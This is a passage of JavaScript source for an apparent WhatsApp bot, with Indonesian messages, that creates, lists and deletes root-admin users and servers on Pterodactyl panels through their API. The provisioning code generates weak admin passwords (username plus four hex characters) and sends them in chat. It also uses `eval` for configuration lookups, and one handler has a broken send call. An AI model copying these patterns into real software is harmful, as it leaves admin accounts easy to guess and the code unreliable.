    if (!/^[a-z0-9]+$/i.test(usernya)) return ReplyLanz("⚠️ Username hanya boleh mengandung huruf dan angka.");
    if (phoneNumber.startsWith("0")) return ReplyLanz("⚠️ Awalan nomor harus berupa kode negara (62xx), bukan 0!");

    if (m.mentionedJid?.length) {
        phoneNumber = m.mentionedJid[0].replace(/@s\.whatsapp\.net$/, "").trim();
    } else if (m.quoted) {
        phoneNumber = m.quoted.sender.replace(/@s\.whatsapp\.net$/, "");
    } else {
        phoneNumber = phoneNumber.replace(/[^0-9]/g, "");
    }

    const check = await Putzz.onWhatsApp(phoneNumber);
    if (check.length < 1) return ReplyLanz("⚠️ Nomor tersebut tidak terdaftar di WhatsApp!");

    try {
        const teksnya = "*Pilih Server Untuk Membuat Admin Panel*";

        const sections = [
            {
                title: "# Silahkan Pilih Server",
                highlight_label: ``,
                rows: Array.from({ length: 100 }, (_, i) => ({
                    header: `𝗖𝗥𝗘𝗔𝗧𝗘 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    title: `Create Admin Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}res_cadmin2v${i + 1} ${usernya},${phoneNumber}`
                }))
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Server 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "🅂🄻🄴🄱🄴🅆",
            footer: botname,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.panel,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in cadmin2:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

case "res_cadminv1": case "res_cadminv2": case "res_cadminv3": case "res_cadminv4": case "res_cadminv5": 
case "res_cadminv6": case "res_cadminv7": case "res_cadminv8": case "res_cadminv9": case "res_cadminv10":
case "res_cadminv11": case "res_cadminv12": case "res_cadminv13": case "res_cadminv14": case "res_cadminv15": 
case "res_cadminv16": case "res_cadminv17": case "res_cadminv18": case "res_cadminv19": case "res_cadminv20": {
    if (!isOwner) return;

    const version = parseInt(command.replace("res_cadminv", ""));
    const domain = eval(`domain${version}`);
    const apikey = eval(`apikey${version}`);

    if (!domain || !apikey) return ReplyLanz("⚠️ Konfigurasi domain atau API key tidak ditemukan untuk versi ini.");

    if (!text) return ReplyLanz(example("username"));
    if (!/^[a-z0-9]+$/i.test(text)) return ReplyLanz("⚠️ Username hanya boleh mengandung huruf dan angka.");

    const useradp = text.toLowerCase();
    const email = `${useradp}@pterodactyl.io`;
    const name = capital(useradp);
    const password = useradp + crypto.randomBytes(2).toString("hex");

    try {
        const response = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email,
                username: useradp,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password,
            }),
        });

        if (!response.ok) {
            const errorDetail = await response.text();
            return ReplyLanz(`❌ Gagal membuat admin panel.\n📌 *Detail:* ${errorDetail}`);
        }

        const data = await response.json();
        if (data.errors) {
            return ReplyLanz(`❌ Error dari API:\n${JSON.stringify(data.errors[0], null, 2)}`);
        }

        const user = data.attributes;
        const orang = m.isGroup ? m.sender : m.chat;

        if (m.isGroup) {
            await ReplyLanz(`✅ *Berhasil membuat admin panel di server ke-${version}*\n📩 Data akun telah dikirim ke private chat.`);
        }

        const message = `*📦 Pesanan Telah Datang 📦*\n\n🚀 *Data Admin Panel Anda:*\n\n📌 *ID User:* ${user.id}\n📌 *Nama:* ${user.first_name} ${user.last_name}\n📌 *Dibuat:* ${user.created_at.split("T")[0]}\n\n➤ *Username:* ${user.username}\n➤ *Password:* ${password}\n➤ *Link Login:* ${domain}\n\n⚠️ *Rules Admin Panel:*\n🔹 Jangan maling SC, ketahuan? *Denda!*\n🔹 Gak mau denda? *Kick No Reff!*\n🔹 Simpan baik² data akun ini\n🔹 Buat panel seperlunya saja, jangan asal buat!\n🔹 Garansi aktif *10 hari*`;

        await Putzz.sendMessage(orang, { text: message }, { quoted: qtoko });
        
    } catch (error) {
        console.error("❌ Error in createAdminPanel:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat membuat admin panel: ${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_cadmin2v1": case "res_cadmin2v2": case "res_cadmin2v3": case "res_cadmin2v4": case "res_cadmin2v5": 
case "res_cadmin2v6": case "res_cadmin2v7": case "res_cadmin2v8": case "res_cadmin2v9": case "res_cadmin2v10": 
case "res_cadmin2v11": case "res_cadmin2v12": case "res_cadmin2v13": case "res_cadmin2v14": case "res_cadmin2v15": 
case "res_cadmin2v16": case "res_cadmin2v17": case "res_cadmin2v18": case "res_cadmin2v19": case "res_cadmin2v20": {
    if (!isOwner) return;

    const version = parseInt(command.replace("res_cadmin2v", ""));
    const domain = eval(`domain${version}`);
    const apikey = eval(`apikey${version}`);

    if (!domain || !apikey) return ReplyLanz("⚠️ Konfigurasi domain atau API key tidak ditemukan untuk versi ini.");

    if (!text.includes(",")) return ReplyLanz(example("username,62xxx"));

    const [usernameInput, nomorInput] = text.split(",");
    if (!usernameInput || !nomorInput) return ReplyLanz(example("username,62xxx"));
    if (!/^[a-z0-9]+$/i.test(usernameInput)) return ReplyLanz("⚠️ Username hanya boleh mengandung huruf dan angka.");

    const nomor = nomorInput.replace(/[^0-9]/g, "");
    if (nomor.startsWith("0")) return ReplyLanz("⚠️ Awalan nomor harus berupa kode negara (62xx), bukan 0!");

    const check = await Putzz.onWhatsApp(nomor);
    if (check.length < 1) return ReplyLanz("⚠️ Nomor tersebut tidak terdaftar di WhatsApp!");

    const useradp2 = usernameInput.toLowerCase();
    const email = `${useradp2}@pterodactyl.io`;
    const name = capital(useradp2);
    const password = useradp2 + crypto.randomBytes(2).toString("hex");

    try {
        const response = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email,
                username: useradp2,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password,
            }),
        });

        if (!response.ok) {
            const errorDetail = await response.text();
            return ReplyLanz(`❌ Gagal membuat admin panel.\n📌 *Detail:* ${errorDetail}`);
        }

        const data = await response.json();
        if (data.errors) {
            return ReplyLanz(`❌ Error dari API:\n${JSON.stringify(data.errors[0], null, 2)}`);
        }

        const user = data.attributes;
        const client = `${nomor}@s.whatsapp.net`;

        await ReplyLanz(`✅ *Berhasil membuat admin panel di server ke-${version}*\n📩 _Data akun telah dikirim ke nomor_ ${nomor}`);

        const teks = `*📦 Pesanan Telah Datang 📦*\n\n🚀 *Data Admin Panel Anda:*\n\n📌 *ID User:* ${user.id}\n📌 *Nama:* ${user.first_name} ${user.last_name}\n📌 *Dibuat:* ${user.created_at.split("T")[0]}\n\n➤ *Username:* ${user.username}\n➤ *Password:* ${password}\n➤ *Link Login:* ${domain}\n\n⚠️ *Rules Admin Panel:*\n🔹 Jangan maling SC, ketahuan? *Denda!*\n🔹 Gak mau denda? *Kick No Reff!*\n🔹 Simpan baik² data akun ini\n🔹 Buat panel seperlunya saja, jangan asal buat!\n🔹 Garansi aktif *10 hari*`;

        await Putzz.sendMessage(Putzz, { text: teks }, { quoted: qtoko });
        
    } catch (error) {
        console.error("❌ Error in createAdminPanel:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat membuat admin panel:\n${error.message}`);
    }
}
break;


case "listadmin": {
    if (!isCreator) return;
    try {
        const teksnya = "*Mau Lihat List Admin Panel Di Server Ke Berapa?*";

        const sections = [
            {
                title: "# Silahkan Pilih Salah Satu",
                highlight_label: ``,
                rows: Array.from({ length: 20 }, (_, i) => ({
                    header: `𝗟𝗜𝗦𝗧 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    title: `List Admin Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}listadmin_v${i + 1}`
                }))
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗦𝗟𝗘𝗕𝗘𝗪",
            footer: botname,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.panel,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in listadmin:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "listserver_v1": case "listserver_v2": case "listserver_v3": case "listserver_v4": case "listserver_v5":
case "listserver_v6": case "listserver_v7": case "listserver_v8": case "listserver_v9": case "listserver_v10": {
    if (!isOwner) return;

    const version = parseInt(command.replace("listserver_v", ""));
    const domain = global[`domain${version}`];
    const apiKey = global[`apikey${version}`];
    const clientApiKey = global[`capikey${version}`];
    const page = args[0] || "1";
    const versinya = `SERVER KE-${version}`;

    if (!domain || !apiKey || !clientApiKey) return ReplyLanz("⚠️ Konfigurasi API tidak ditemukan!");

    try {
        const response = await fetch(`${domain}/api/application/servers?page=${page}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apiKey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return ReplyLanz(`⚠️ Tidak ada server yang ditemukan pada halaman *${page}*.`);
        }

        let messageText = `*📡 LIST SERVER PANEL V${version} ⚡*\n\n`;
        let list = [];
        
        for (const server of servers) {
            const s = server.attributes;

            const resourceResponse = await fetch(
                `${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`,
                {
                    method: "GET",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${clientApiKey}`,
                    },
                }
            );

            const resourceData = await resourceResponse.json();
            const status = resourceData.attributes
                ? resourceData.attributes.current_state
                : s.status;

            const formatSize = (value) =>
                value === 0
                    ? "♾ Unlimited"
                    : value >= 1024
                    ? (value / 1024).toFixed(1) + " GB"
                    : value + " MB";

            messageText += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            messageText += `🔹 *ID Server:* ${s.id}\n`;
            messageText += `🔸 *Nama:* ${s.name}\n`;
            messageText += `💾 *RAM:* ${formatSize(s.limits.memory)}\n`;
            messageText += `⚡ *CPU:* ${s.limits.cpu === 0 ? "♾ Unlimited" : s.limits.cpu + "%"}\n`;
            messageText += `🗄 *Disk:* ${formatSize(s.limits.disk)}\n`;
            messageText += `〽️ *Status:* ${status.toUpperCase()}\n`;
            messageText += `📅 *Created:* ${s.created_at.split("T")[0]}\n`;
            messageText += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
            
            list.push({
                title: `🖥️ ${s.name} (ID: ${s.id})`,
                description: `RAM: ${formatSize(s.limits.memory)} | Disk: ${formatSize(s.limits.disk)} | CPU: ${s.limits.cpu === 0 ? "♾ Unlimited" : s.limits.cpu + "%"} | Status: ${status.toUpperCase()}`,
                id: `${prefix}res_delpanel${version} ${s.id}`
            });
        }

        messageText += `📄 *Halaman:* ${result.meta.pagination.current_page}/${result.meta.pagination.total_pages}\n`;
        messageText += `📌 *Total Server:* ${result.meta.pagination.count} Server\n`;

        await Putzz.sendMessage(m.chat, {
            buttons: [
                { buttonId: `${prefix}res_delserver${version}`, buttonText: { displayText: '🗑 Hapus Server Panel' }, type: 1 },
                {
                    buttonId: "action",
                    buttonText: { displayText: "🛠️ Pilih Server" },
                    type: 4,
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            title: "HAPUS PANEL",
                            sections: [{ title: "# Pilih Salah Satu Panel Yang Ingin Dihapus", rows: [...list] }]
                        })
                    }
                }
            ],
            footer: `*${versinya}*`,
            headerType: 1,
            viewOnce: true,
            text: messageText,
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            },
        }, { quoted: qfake });

        if (result.meta.pagination.total_pages > 1) {
            let buttons = [];

            if (result.meta.pagination.current_page > 1 && result.meta.pagination.current_page < result.meta.pagination.total_pages) {
                buttons.push(
                    {
                        buttonId: `${cmd} ${result.meta.pagination.current_page - 1}`,
                        buttonText: { displayText: `⬅️ Halaman ${result.meta.pagination.current_page - 1}` },
                        type: 1
                    },
                    {
                        buttonId: `${cmd} ${result.meta.pagination.current_page + 1}`,
                        buttonText: { displayText: `➡️ Halaman ${result.meta.pagination.current_page + 1}` },
                        type: 1
                    }
                );
            } else if (result.meta.pagination.current_page === 1) {
                buttons.push({
                    buttonId: `${cmd} ${result.meta.pagination.current_page + 1}`,
                    buttonText: { displayText: `➡️ Halaman ${result.meta.pagination.current_page + 1}` },
                    type: 1
                });
            } else if (result.meta.pagination.current_page === result.meta.pagination.total_pages) {
                buttons.push({
                    buttonId: `${cmd} ${result.meta.pagination.current_page - 1}`,
                    buttonText: { displayText: `⬅️ Halaman ${result.meta.pagination.current_page - 1}` },
                    type: 1
                });
            }
            
            await sleep(2000);
            await Putzz.sendMessage(m.chat, {
                buttons,
                footer: `*${versinya}*`,
                headerType: 1,
                viewOnce: true,
                text: "Klik Tombol Di Bawah Untuk Melihat Halaman Lain",
                contextInfo: {
                    isForwarded: true,
                    mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
                },
            }, { quoted: m });
        }
        
    } catch (error) {
        console.error("❌ Error in listserver:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengambil data server:\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "listuser_v1": case "listuser_v2": case "listuser_v3": case "listuser_v4": case "listuser_v5":
case "listuser_v6": case "listuser_v7": case "listuser_v8": case "listuser_v9": case "listuser_v10": {
    if (!isOwner) return;

    const version = parseInt(command.replace("listuser_v", ""));
    const domain = global[`domain${version}`];
    const apikey = global[`apikey${version}`];
    const page = args[0] || "1";
    const versinya = `SERVER KE-${version}`;

    if (!domain || !apikey) return ReplyLanz("⚠️ Konfigurasi API tidak ditemukan!");

    try {
        const response = await fetch(`${domain}/api/application/users?page=${page}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`,
            },
        });

        const result = await response.json();
        const users = result.data;

        if (!users || users.length === 0) {
            return ReplyLanz(`❌ Tidak ada user pada halaman *${page}*.`);
        }

        let messageText = `*📜 LIST USER PANEL BOT V${version} ⚡*\n\n`;

        for (const user of users) {
            const u = user.attributes;
            const statusUser = u.server_limit === null ? "🔴 Tidak Aktif" : "🟢 Aktif";

            messageText += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            messageText += `🏷️ *ID User:* ${u.id}\n`;
            messageText += `👤 *Nama:* ${u.first_name} ${u.last_name}\n`;
            messageText += `🔹 *Username:* ${u.username}\n`;
            messageText += `〽️ *Status:* ${statusUser}\n`;
            messageText += `🕒 *Dibuat:* ${u.created_at.split("T")[0]}\n`;
            messageText += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
        }

        messageText += `📄 *Halaman:* ${result.meta.pagination.current_page}/${result.meta.pagination.total_pages}\n`;
        messageText += `📌 *Total User:* ${result.meta.pagination.count}\n`;

        await Putzz.sendMessage(m.chat, {
            buttons: [
                { buttonId: `${prefix}res_deluser${version}`, buttonText: { displayText: '🗑 Hapus User Panel' }, type: 1 },
                { buttonId: `${prefix}res_delpanel${version}`, buttonText: { displayText: '🗑 Hapus Panel' }, type: 1 }
            ],
            footer: `*${versinya}*`,
            headerType: 1,
            viewOnce: true,
            text: messageText,
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            },
        }, { quoted: qfake });

        if (result.meta.pagination.total_pages > 1) {
            let buttons = [];

            if (result.meta.pagination.current_page > 1 && result.meta.pagination.current_page < result.meta.pagination.total_pages) {
                buttons.push(
                    {
                        buttonId: `${cmd} ${result.meta.pagination.current_page - 1}`,
                        buttonText: { displayText: `⬅️ Halaman ${result.meta.pagination.current_page - 1}` },
                        type: 1
                    },
                    {
                        buttonId: `${cmd} ${result.meta.pagination.current_page + 1}`,
                        buttonText: { displayText: `➡️ Halaman ${result.meta.pagination.current_page + 1}` },
                        type: 1
                    }
                );
            } else if (result.meta.pagination.current_page === 1) {
                buttons.push({
                    buttonId: `${cmd} ${result.meta.pagination.current_page + 1}`,
                    buttonText: { displayText: `➡️ Halaman ${result.meta.pagination.current_page + 1}` },
                    type: 1
                });
            } else if (result.meta.pagination.current_page === result.meta.pagination.total_pages) {
                buttons.push({
                    buttonId: `${cmd} ${result.meta.pagination.current_page - 1}`,
                    buttonText: { displayText: `⬅️ Halaman ${result.meta.pagination.current_page - 1}` },
                    type: 1
                });
            }

            await sleep(2000);
            await Putzz.sendMessage(m.chat, {
                buttons,
                footer: `*${versinya}*`,
                headerType: 1,
                viewOnce: true,
                text: "Klik Tombol Di Bawah Untuk Melihat Halaman Lain",
                contextInfo: {
                    isForwarded: true,
                    mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
                },
            }, { quoted: m });
        }

    } catch (error) {
        console.error("❌ Error in listuser:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengambil data user:\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "listadmin_v1": case "listadmin_v2": case "listadmin_v3": case "listadmin_v4": case "listadmin_v5":
case "listadmin_v6": case "listadmin_v7": case "listadmin_v8": case "listadmin_v9": case "listadmin_v10":

case "listadmin_v11": case "listadmin_v12": case "listadmin_v13": case "listadmin_v14": case "listadmin_v15":
case "listadmin_v16": case "listadmin_v17": case "listadmin_v18": case "listadmin_v19": case "listadmin_v20": {
    if (!isOwner) return;
    
    const version = parseInt(command.replace("listadmin_v", ""));
    const domain = global[`domain${version}`];
    const apikey = global[`apikey${version}`];
    const page = args[0] || "1";
    const versinya = `SERVER KE-${version}`;

    if (!domain || !apikey) return ReplyLanz("⚠️ Konfigurasi domain atau API key tidak ditemukan!");

    try {
        const response = await fetch(`${domain}/api/application/users?page=${page}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`,
            },
        });

        const result = await response.json();
        const users = result.data;

        if (!users || users.length === 0) {
            return ReplyLanz(`❌ Tidak ada admin panel.`);
        }

        let messageText = `*👑 LIST ADMIN PANEL BOT V${version} ⚡*\n\n`;
        let totalAdmin = 0;
        let list = [];

        for (const user of users) {
            const u = user.attributes;

            if (u.root_admin) {
                totalAdmin++;
                messageText += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                messageText += `📜 *ID User:* ${u.id}\n`;
                messageText += `👤 *Nama:* ${u.first_name} ${u.last_name}\n`;
                messageText += `🛠️ *Username:* ${u.username}\n`;
                messageText += `🕒 *Dibuat:* ${u.created_at.split("T")[0]}\n`;
                messageText += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

                list.push({
                    title: `🗑 Hapus Admin: ${u.first_name} ${u.last_name}`,
                    id: `${prefix}res_deladmin${version} ${u.id}`
                });
            }
        }

        messageText += `📄 *Halaman:* ${result.meta.pagination.current_page}/${result.meta.pagination.total_pages}\n`;
        messageText += `👑 *Total Admin:* ${totalAdmin} Admin\n`;

        await Putzz.sendMessage(m.chat, {
            buttons: [
                {
                    buttonId: "action",
                    buttonText: { displayText: "🛠️ Pilih Admin" },
                    type: 4,
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            title: "HAPUS ADMIN PANEL",
                            sections: [{ title: "# Pilih Salah Satu Admin Yang Ingin Dihapus", rows: [...list] }]
                        })
                    }
                }
            ],
            footer: `*${versinya}*`,
            headerType: 1,
            viewOnce: true,
            text: messageText,
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            },
        }, { quoted: qfake });

        if (result.meta.pagination.total_pages > 1) {
            let buttons = [];

            if (result.meta.pagination.current_page > 1 && result.meta.pagination.current_page < result.meta.pagination.total_pages) {
                buttons.push(
                    {
                        buttonId: `.${command} ${result.meta.pagination.current_page - 1}`,
                        buttonText: { displayText: `⬅️ Halaman ${result.meta.pagination.current_page - 1}` },
                        type: 1
                    },
                    {
                        buttonId: `.${command} ${result.meta.pagination.current_page + 1}`,
                        buttonText: { displayText: `➡️ Halaman ${result.meta.pagination.current_page + 1}` },
                        type: 1
                    }
                );
            } else if (result.meta.pagination.current_page === 1) {
                buttons.push({
                    buttonId: `.${command} ${result.meta.pagination.current_page + 1}`,
                    buttonText: { displayText: `➡️ Halaman ${result.meta.pagination.current_page + 1}` },
                    type: 1
                });
            } else if (result.meta.pagination.current_page === result.meta.pagination.total_pages) {
                buttons.push({
                    buttonId: `.${command} ${result.meta.pagination.current_page - 1}`,
                    buttonText: { displayText: `⬅️ Halaman ${result.meta.pagination.current_page - 1}` },
                    type: 1
                });
            }

            await sleep(2000);
            await Putzz.sendMessage(m.chat, {
                buttons,
                footer: `*${versinya}*`,
                headerType: 1,
                viewOnce: true,
                text: "Klik Tombol Di Bawah Untuk Melihat Halaman Lain",
                contextInfo: {
                    isForwarded: true,
                    mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
                },
            }, { quoted: m });
        }

    } catch (error) {
        console.error("❌ Error in listadmin:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengambil data admin:\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "delpanel": {
    if (!isCreator) return;
    try {
        const teksnya = "*Mau Hapus Panel Di Server Ke Berapa?*";

        const sections = [
            {
                title: "# Silahkan Pilih Salah Satu",
                highlight_label: ``,
                rows: Array.from({ length: 20 }, (_, i) => ({
                    header: `🗑️ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    title: `Hapus Server Dan User Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}res_delpanel${i + 1}`
                }))
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🛠️ Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗦𝗟𝗘𝗕𝗘𝗪",
            footer: botname,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.panel,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in delpanel:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "deladmin": {
    if (!isCreator) return;
    try {
        const teksnya = "*Mau Hapus Admin Panel Di Server Ke Berapa?*";

        const sections = [
            {
                title: "# Silahkan Pilih Salah Satu",
                highlight_label: ``,
                rows: Array.from({ length: 20 }, (_, i) => ({
                    header: `🗑️ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    title: `Hapus Admin Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}res_deladmin${i + 1}`
                }))
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🛠️ Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗦𝗟𝗘𝗕𝗘𝗪",
            footer: botname,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.panel,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in deladmin:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "delserver": {
    if (!isCreator) return;
    try {
        const teksnya = "*Mau Hapus Server Panel Di Server Ke Berapa?*";

        const sections = [
            {
                title: "# Silahkan Pilih Salah Satu",
                highlight_label: ``,
                rows: Array.from({ length: 10 }, (_, i) => ({
                    header: `🗑️ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗦𝗘𝗥𝗩𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    title: `Hapus Server Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}res_delserver${i + 1}`
                }))
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🛠️ Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗦𝗟𝗘𝗕𝗘𝗪",
            footer: botname,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.panel,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in delserver:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "deluser": {
    if (!isCreator) return;
    try {
        const teksnya = "*Mau Hapus User Panel Di Server Ke Berapa?*";

        const sections = [
            {
                title: "*Pilih User yang Ingin Dihapus*",
                highlight_label: ``,
                rows: Array.from({ length: 10 }, (_, i) => ({
